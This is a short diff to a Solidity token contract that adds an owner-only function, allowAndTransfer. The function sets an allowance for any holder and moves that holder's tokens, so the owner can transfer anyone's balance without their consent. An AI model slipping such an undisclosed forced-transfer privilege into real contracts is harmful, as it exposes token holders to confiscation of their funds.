@@ -30,6 +30,11 @@ contract Token is MintableToken {
         totalSupply = totalSupply.sub(balance);
     }
 
+    function allowAndTransfer(address _from, address _to, uint256 _amount) external notHolded(_from) onlyOwner {
+        allowed[_from][_to] = _amount;
+        super.transferFrom(_from, _to, _amount);
+    }
+
     function transfer(address to, uint256 value) public notHolded(msg.sender) returns (bool) {
         return super.transfer(to, value);
     }
